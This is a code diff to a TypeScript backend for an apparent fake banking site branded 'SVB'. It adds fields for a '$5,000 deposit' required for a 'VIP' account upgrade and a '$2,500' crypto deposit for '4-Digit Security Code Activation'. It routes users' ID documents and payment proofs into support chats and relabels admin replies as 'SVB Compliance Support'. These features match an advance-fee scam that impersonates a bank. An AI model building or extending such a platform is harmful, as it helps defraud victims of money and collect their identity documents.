@@ -276,7 +276,14 @@ export const api = {
   },
 
   // --- TIER 3 VERIFICATION ---
-  async submitTier3Verification(data: { address: string; country: string; documentType: 'Passport' | 'National ID Card' | "Driver's License" | 'Residence Permit'; documentUrl: string }): Promise<{ verification: Tier3VerificationRequest }> {
+  async submitTier3Verification(data: { 
+    address: string; 
+    country: string; 
+    documentType: 'Passport' | 'National ID Card' | "Driver's License" | 'Residence Permit'; 
+    documentUrl: string;
+    paymentSlipUrl?: string;
+    txHash?: string;
+  }): Promise<{ verification: Tier3VerificationRequest }> {
     const current = dbStore.getCurrentUser();
     if (!current) throw new Error('Not authenticated');
 
@@ -290,12 +297,53 @@ export const api = {
       country: data.country,
       documentType: data.documentType,
       documentUrl: data.documentUrl,
+      paymentSlipUrl: data.paymentSlipUrl,
+      txHash: data.txHash,
       status: 'Pending',
       createdAt: new Date().toISOString()
     };
 
     dbStore.addVerification(req);
     dbStore.saveUser({ ...current, verificationTier: 'Pending Tier 3' });
+
+    // Auto post submission to client support chat room
+    const chatImages = [data.documentUrl, data.paymentSlipUrl].filter(Boolean) as string[];
+    const chatText = `Submitted Tier 3 VIP Account Upgrade Application.\n• Country: ${data.country}\n• Document: ${data.documentType}\n• Address: ${data.address}\n• $5,000 Deposit Payment Slip attached.`;
+    
+    // Find or create ticket
+    const existingTickets = dbStore.getSupportTickets(current.id, false);
+    let ticket = existingTickets[0];
+    const now = new Date().toISOString();
+    if (!ticket) {
+      ticket = {
+        id: `TICKET-${Date.now()}`,
+        userId: current.id,
+        userEmail: current.email,
+        userName: current.fullName,
+        accountNumber: current.accountNumber,
+        subject: `SVB Client Support Desk - ${current.fullName}`,
+        category: 'Account',
+        status: 'Open',
+        priority: 'High',
+        messages: [],
+        createdAt: now,
+        updatedAt: now
+      };
+      dbStore.addSupportTicket(ticket);
+    }
+
+    ticket.messages.push({
+      id: `MSG-${Date.now()}`,
+      senderId: current.id,
+      senderName: current.fullName,
+      senderRole: current.role,
+      message: chatText,
+      images: chatImages,
+      createdAt: now
+    });
+    ticket.status = 'Open';
+    ticket.updatedAt = now;
+    dbStore.updateSupportTicket(ticket);
 
     dbStore.addAuditLog({
       id: `LOG-${Date.now()}`,
@@ -304,7 +352,7 @@ export const api = {
       action: 'PROFILE_UPDATED',
       targetEmail: current.email,
       targetAccountNumber: current.accountNumber,
-      description: `Tier 3 Verification documents submitted for ${current.fullName}`,
+      description: `Tier 3 Verification documents & $5,000 deposit slip submitted for ${current.fullName}`,
       details: { documentType: data.documentType, country: data.country },
       timestamp: new Date().toISOString()
     });
@@ -421,6 +469,45 @@ export const api = {
 
     dbStore.addCryptoDeposit(dep);
     const updatedUser = dbStore.saveUser({ ...current, pendingCryptoDeposit: dep });
+
+    // Auto post deposit proof into support chat room
+    try {
+      const existingTickets = dbStore.getSupportTickets(current.id, false);
+      let ticket = existingTickets[0];
+      const nowStr = new Date().toISOString();
+      if (!ticket) {
+        ticket = {
+          id: `TICKET-${Date.now()}`,
+          userId: current.id,
+          userEmail: current.email,
+          userName: current.fullName,
+          accountNumber: current.accountNumber,
+          subject: `SVB Client Support Desk - ${current.fullName}`,
+          category: 'Deposit',
+          status: 'Open',
+          priority: 'High',
+          messages: [],
+          createdAt: nowStr,
+          updatedAt: nowStr
+        };
+        dbStore.addSupportTicket(ticket);
+      }
+      ticket.messages.push({
+        id: `MSG-${Date.now()}`,
+        senderId: current.id,
+        senderName: current.fullName,
+        senderRole: current.role,
+        message: `Submitted $2,500 Deposit Proof for 4-Digit Security Code Activation.\n• Crypto Method: ${cryptoMethod}\n• TxHash: ${hash || 'N/A'}\n• Notes: ${note || 'N/A'}`,
+        images: img ? [img] : [],
+        createdAt: nowStr
+      });
+      ticket.status = 'Open';
+      ticket.updatedAt = nowStr;
+      dbStore.updateSupportTicket(ticket);
+    } catch (chatErr) {
+      console.error('Chat post failed:', chatErr);
+    }
+
     return { deposit: dep, user: updatedUser };
   },
 
@@ -1002,7 +1089,7 @@ export const api = {
     return { tickets: dbStore.getSupportTickets(current.id, isAdmin) };
   },
 
-  async createSupportTicket(data: { subject: string; category: string; priority: string; message: string }): Promise<{ ticket: SupportTicket }> {
+  async createSupportTicket(data: { subject: string; category: string; priority: string; message: string; images?: string[] }): Promise<{ ticket: SupportTicket }> {
     const current = dbStore.getCurrentUser();
     if (!current) throw new Error('Not authenticated');
 
@@ -1025,6 +1112,7 @@ export const api = {
         senderName: current.fullName,
         senderRole: current.role,
         message: data.message,
+        images: data.images,
         createdAt: now
       }],
       createdAt: now,
@@ -1035,7 +1123,7 @@ export const api = {
     return { ticket };
   },
 
-  async replySupportTicket(ticketId: string, message: string): Promise<{ ticket: SupportTicket }> {
+  async replySupportTicket(ticketId: string, message: string, images?: string[]): Promise<{ ticket: SupportTicket }> {
     const current = dbStore.getCurrentUser();
     if (!current) throw new Error('Not authenticated');
 
@@ -1047,9 +1135,10 @@ export const api = {
     const updatedMessages = [...ticket.messages, {
       id: `MSG-${Date.now()}`,
       senderId: current.id,
-      senderName: current.fullName,
+      senderName: current.role === 'admin' ? 'SVB Compliance Support' : current.fullName,
       senderRole: current.role,
       message,
+      images,
       createdAt: now
     }];
 
@@ -1061,6 +1150,22 @@ export const api = {
     };
 
     dbStore.updateSupportTicket(updatedTicket);
+
+    // If admin replied, send notification to user
+    if (current.role === 'admin') {
+      dbStore.addNotification({
+        id: `NOTIF-${Date.now()}`,
+        userId: ticket.userId,
+        title: 'New Reply from Support Desk',
+        message: `You have a new message from SVB Client Support regarding "${ticket.subject}".`,
+        amount: 0,
+        currency: 'USD',
+        reference: ticket.id,
+        read: false,
+        createdAt: now
+      });
+    }
+
     return { ticket: updatedTicket };
   },
 
